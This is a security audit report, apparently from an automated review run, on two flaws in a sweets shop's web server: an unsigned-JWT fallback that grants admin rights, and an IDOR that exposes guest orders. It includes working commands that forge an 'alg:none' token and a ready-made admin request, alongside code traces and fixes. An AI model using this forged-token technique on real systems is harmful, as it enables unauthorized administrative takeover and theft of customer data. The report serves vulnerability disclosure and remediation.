# Detailed Findings and Proofs of Concept

This document provides complete technical reproductions, traces, invariants, and source code remediations for all `CRITICAL`, `HIGH`, and `MEDIUM` confirmed vulnerabilities identified in `run-1`.

---

## 1. Finding: Unsigned JWT Fallback Allows Unauthenticated Full ADMIN Takeover

- **Fingerprint**: `auth-unverified-jwt-admin-privilege-escalation`
- **Severity**: **CRITICAL** (Likelihood: Critical | Impact: Critical)
- **Primary Source File**: [server/authMiddleware.ts](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/authMiddleware.ts#L81-L127)

### Ordered Execution Trace
1. **Entrypoint**: [server/authMiddleware.ts:14-18](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/authMiddleware.ts#L14-L18)
   `authenticateToken` extracts the Bearer token from the `Authorization` header.
2. **Propagation (Bypass Supabase Verification)**: [server/authMiddleware.ts:29-31](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/authMiddleware.ts#L29-L31)
   When an attacker provides an unverified or forged token (or when Supabase returns an error for invalid signatures), `req.user` remains unset.
3. **Propagation (Unverified Fallback Parsing)**: [server/authMiddleware.ts:81-95](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/authMiddleware.ts#L81-L95)
   The fallback block executes:
   ```ts
   if (!req.user) {
     if (token.includes('.')) {
       const parts = token.split('.');
       if (parts.length >= 2) {
         payloadJson = Buffer.from(parts[1], 'base64url').toString('utf8');
       }
     }
     const decoded = JSON.parse(payloadJson);
   ```
4. **Propagation (Role Elevation)**: [server/authMiddleware.ts:110-121](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/authMiddleware.ts#L110-L121)
   The decoded token payload is evaluated:
   ```ts
   role: decoded.role === 'service_role' ? 'ADMIN' : 'CUSTOMER',
   ```
   An in-memory user profile is instantiated with role `ADMIN` and bound to `req.user`.
5. **Sink (Authorization Bypass)**: [server/routes/adminRoutes.ts:34](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/routes/adminRoutes.ts#L34)
   Administrative route guard `router.use(requireRole(['ADMIN', 'STAFF']))` reads `req.user.role`, observes `'ADMIN'`, and permits access.

### Target-Neutral Local Reproduction
- **Attacker Perspective**: Anonymous external network attacker with no credentials.
- **Affected Resource**: All store administrative APIs (`/api/admin/*`), including store toggles, products, inventory, coupons, Cashfree refunds, and customer database.
- **Payload Generation**:
  ```bash
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
  PAYLOAD=$(echo -n '{"sub":"attacker-root","role":"service_role","exp":9999999999}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
  FORGED_TOKEN="${HEADER}.${PAYLOAD}."
  ```
- **HTTP Invocation**:
  ```http
  GET /api/admin/overview HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlci1yb290Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImV4cCI6OTk5OTk5OTk5OX0.
  ```
- **Observed Result**:
  Server returns `200 OK` with store analytics, today's order metrics, and pending order counts. The attacker has full administrative privileges.

### Proven Security Invariant
> *Untrusted identity assertions must never be accepted without cryptographic verification against trusted identity providers.*

### Source-Level Remediation
In `server/authMiddleware.ts`, remove the unverified decoding block completely:

```diff
-    // Fallback: Attempt decode JWT / session token payload if not resolved by Supabase
-    if (!req.user) {
-      try {
-        let payloadJson: string | null = null;
-        if (token.includes('.')) {
-          const parts = token.split('.');
-          if (parts.length >= 2) {
-            payloadJson = Buffer.from(parts[1], 'base64url').toString('utf8');
-          }
-        } else {
-          payloadJson = Buffer.from(token, 'base64').toString('utf8');
-        }
-
-        if (payloadJson) {
-          const decoded = JSON.parse(payloadJson);
-          const userId = decoded.sub || decoded.id;
-
-          if (decoded.exp) {
-            const expMs = decoded.exp > 1e11 ? decoded.exp : decoded.exp * 1000;
-            if (Date.now() >= expMs) {
-              return next();
-            }
-          }
-
-          if (userId) {
-            let existing = inMemoryStore.profiles.get(userId);
-            if (!existing) {
-              existing = {
-                id: userId,
-                phone: decoded.phone || (decoded.user_metadata?.phone as string),
-                email: decoded.email,
-                full_name: decoded.user_metadata?.full_name || decoded.full_name || '',
-                role: decoded.role === 'service_role' ? 'ADMIN' : 'CUSTOMER',
-                created_at: new Date().toISOString(),
-                updated_at: new Date().toISOString(),
-              };
-              inMemoryStore.profiles.set(userId, existing);
-            }
-            req.user = existing;
-          }
-        }
-      } catch {
-        // not a valid JWT or JSON token
-      }
-    }
+    // If not validated by Supabase, request remains unauthenticated
```

---

## 2. Finding: Insecure Direct Object Reference (IDOR) on Guest Orders Exposes Customer PII

- **Fingerprint**: `order-idor-guest-order-pii-exposure`
- **Severity**: **MEDIUM** (Likelihood: Medium | Impact: Medium)
- **Primary Source File**: [server/routes/orderRoutes.ts](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/routes/orderRoutes.ts#L778-L786)

### Ordered Execution Trace
1. **Entrypoint**: [server/routes/orderRoutes.ts:754](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/routes/orderRoutes.ts#L754)
   `GET /api/orders/:orderNumber` receives an order number from an authenticated customer request.
2. **Propagation (Order Lookup)**: [server/routes/orderRoutes.ts:757-768](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/routes/orderRoutes.ts#L757-L768)
   The order is retrieved from the database or in-memory store. For a guest order, `order.user_id` is `null` or `undefined`.
3. **Propagation (Flawed Ownership Check)**: [server/routes/orderRoutes.ts:778-784](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/routes/orderRoutes.ts#L778-L784)
   ```ts
   if (req.user && req.user.role === 'CUSTOMER') {
     if (order.user_id && order.user_id !== req.user.id) {
       res.status(404).json({ error: 'ORDER_NOT_FOUND', message: `Order #${orderNumber} not found.` });
       return;
     }
   }
   ```
   Because `order.user_id` is falsy, `if (order.user_id && ...)` evaluates to `false`, bypassing the check entirely!
4. **Sink (PII Disclosure)**: [server/routes/orderRoutes.ts:786](file:///c:/Users/yadav/OneDrive/Desktop/saraswati-sweets---artisanal-mithai-&-namkeen/server/routes/orderRoutes.ts#L786)
   ```ts
   res.json({ order });
   ```
   The full unmasked order object is returned, exposing the guest buyer's full name, mobile number, delivery address, and ordered items.

### Target-Neutral Local Reproduction
- **Attacker Perspective**: Any registered customer with valid credentials.
- **Affected Resource**: Guest order records placed without login.
- **HTTP Invocation**:
  ```http
  GET /api/orders/SS-20261011-8492 HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <valid-customer-jwt>
  ```
- **Observed Result**:
  Server returns `200 OK` containing:
  ```json
  {
    "order": {
      "order_number": "SS-20261011-8492",
      "address_snapshot": {
        "recipient_name": "Deepak Sharma",
        "recipient_phone": "9876543210",
        "street_address": "Flat 402, Royal Palms, Lucknow Road",
        "city": "Barabanki",
        "pincode": "225001"
      },
      "items": [...],
      "total_amount": 1450
    }
  }
  ```

### Proven Security Invariant
> *A customer principal must never access records belonging to another party unless explicit tenancy or verified ownership is demonstrated.*

### Source-Level Remediation
In `server/routes/orderRoutes.ts`:

```diff
   // If user is authenticated and not staff, verify ownership
   if (req.user && req.user.role === 'CUSTOMER') {
-    if (order.user_id && order.user_id !== req.user.id) {
+    if (!order.user_id || order.user_id !== req.user.id) {
       res.status(404).json({ error: 'ORDER_NOT_FOUND', message: `Order #${orderNumber} not found.` });
       return;
     }
   }
```
